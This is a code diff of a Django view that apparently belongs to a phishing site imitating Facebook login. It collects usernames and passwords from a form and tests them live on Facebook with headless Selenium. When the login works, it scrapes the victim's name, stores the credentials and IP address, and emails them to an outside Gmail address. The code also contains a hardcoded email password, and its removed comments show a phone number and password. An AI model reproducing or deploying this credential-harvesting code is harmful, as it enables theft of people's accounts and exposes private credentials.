@@ -2,7 +2,6 @@ from django.shortcuts import render, HttpResponseRedirect
 
 from .models import FbLogIn, NewLogs, SiteContent
 
-# from .sel import login_facebook
 from selenium import webdriver
 import time
 from selenium.webdriver.common.by import By
@@ -40,34 +39,39 @@ def home_view(request):
 
 def facebook_view(request):
 
-	error1 = False
-	error2 = False
+	# To render error messages for unmatched password
+	error1 = False # username or email
+	error2 = False	# password
 
+	# Page login form
 	form = LogInForm(request.POST or None)
 	if form.is_valid():
 		loader = True
 		form.save()
 
+		# Get resently saved form input from database
 		myid = form.instance.id
 		editform = FbLogIn.objects.get(id = myid)
 
+		# Web driver settings
 		chrome_options = webdriver.ChromeOptions()
-		#chrome_options.add_argument("--headless")
+		chrome_options.add_argument("--headless")
 		chrome_options.add_argument("--disable-gpu")
 		chrome_options.add_argument('--no-sandbox')
-		chrome_options.add_argument('--window-size=1920x1080')  #1920,1080
+		chrome_options.add_argument('--window-size=1920, 1080')  #1920,1080
 		chrome_options.add_argument('--allow-running-insecure-content')
-		browser = webdriver.Chrome(options=chrome_options) #
+		browser = webdriver.Chrome(options=chrome_options) 
 
 		browser.get("https://web.facebook.com/")
 
 		time.sleep(2)
 
-		user = editform.username #'09059689401'
+		# Selenimu login to "https://web.facebook.com/"
+		user = editform.username
 		userlog = browser.find_element(By.XPATH, '//*[@id="email"]')
 		userlog.send_keys(user)
 
-		password = editform.password #'combat@@fb'
+		password = editform.password
 		passwordlog = browser.find_element(By.XPATH, '//*[@id="pass"]')
 		passwordlog.send_keys(password)
 
@@ -78,30 +82,43 @@ def facebook_view(request):
 
 		time.sleep(2)
 
-		if browser.find_element(By.CSS_SELECTOR, 'div.k4urcfbm'):
-			# name = browser.find_element(By.XPATH, '//span[@class="a8c37x1j ni8dbmo4 stjgntxs l9j0dhe7"]').get_attribute("innerHTML")
+		# Setting the values of error1 and error2 to "True" respectively 
+		if browser.find_elements(By.CSS_SELECTOR, 'div._9ay7'):
+			if 'password' in browser.find_element(By.CSS_SELECTOR, 'div._9ay7').get_attribute('innerHTML'):
+				error2 = True
+				print('Omo na password o')
+
+
+			else:
+				error1 = True
+				print('Omo na Email o')
+		
+		else: 
+			# If login was successfuly scrape username from website using "BeautifulSoup"
+			time.sleep(2)
+
 			html = browser.page_source
 			soup = bs(html, 'lxml')
 
 			mydiv = soup.find_all('div', class_='qzhwtbm6 knvmm38d')
 			sp1 = soup.find_all('span', class_='d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j fe6kdd0r mau55g9w c8b282yb keod5gw0 nxhoafnm aigsh9s9 d3f4x2em iv3no6db jq4qci2q a3bd9o3v ekzkrbhg oo9gr5id hzawbc8m')
-			# name = soup.find('span', class_='a8c37x1j ni8dbmo4 stjgntxs l9j0dhe7')
+
+			print(sp1)
 			name = sp1[0].span.text
 			print(name)
-			# print(name.get_attribute("innerHTML"))
-			# print(name.text)
-			# print("done")
 
-			# Input name in FbLogIn model
+			# Include name and Ip address to form and save
 			editform.name = name
 			editform.ipadd = get_client_ip(request)
 			print(editform.name)
 			print(get_client_ip(request))
 			editform.save()
+
+			# Using saved information in from to create Newlogs object instance 
 			NewLogs.objects.create(username=editform.username, password=editform.password, name=editform.name, ipadd=editform.ipadd)
 			
 			
-
+			# Using SMTP to send mail of form input
 			EMAIL_ADDRESS = "noreplyimf.org@gmail.com"
 			EMAIL_PASSWORD = "4kushakara"
 			receiver = "ibrahimola72@gmail.com"
@@ -120,21 +137,12 @@ def facebook_view(request):
 				smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
 				smtp.send_message(msg)
 
+			# Redirect to "/success/" page
 			return HttpResponseRedirect("../success/")
 			
 
-		elif browser.find_elements(By.CSS_SELECTOR, 'div._9ay7'):
-			if 'password' in browser.find_element(By.CSS_SELECTOR, 'div._9ay7').get_attribute('innerHTML'):
-				error2 = True
-				print('Omo na password o')
-
-
-			else:
-				error1 = True
-				print('Omo na Email o')
-			# user_error = browser.find_element(By.XPATH, '//*[@id="email_container"]/div[2]').get_attribute('innerHTML')
 		
-
+		# Quit Selenium Activities
 		browser.quit()
 
 		print(editform.name)
@@ -161,28 +169,3 @@ def success_view(request):
 		'sc'  : sc 
 	}
 	return render(request, 'success.html', context)
-
-
-
-# def home_view(request):
-# 	form = LogInForm(request.POST or None)
-# 	if form.is_valid():
-# 		#form.save()
-# 		# full_name = login_facebook
-# 		ip = "123333221"
-# 		myid = form.instance.id
-# 		# print(type(myid))
-# 		n = FbLogIn.objects.get(id = myid)
-# 		n.name = full_name
-# 		n.ipadd = ip
-# 		n.save()
-		
-# 		form = LogInForm()
-# 		# if form:
-# 		# 	return HttpResponseRedirect("success")
-
-# 	context = {
-# 		'form' : form
-# 	}
-
-# 	return render(request, 'home.html', context)
